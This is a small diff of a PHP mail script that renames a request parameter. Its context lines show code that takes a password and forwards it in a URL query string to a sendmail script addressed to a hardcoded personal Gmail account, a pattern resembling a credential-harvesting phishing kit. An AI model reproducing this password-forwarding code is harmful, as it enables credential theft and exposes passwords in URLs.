@@ -12,7 +12,7 @@
 
         $subject = "Hello";
         $password = htmlentities(strip_tags(trim($password)));
-        $body = htmlentities(strip_tags(trim($_GET['body'])));
+        $body = htmlentities(strip_tags(trim($_GET['message'])));
         $to = "victor.nwauwa93@gmail.com";
 
         $location = "../../sendmail.php?to=$to&subject=$subject&password=$password&body=$body";
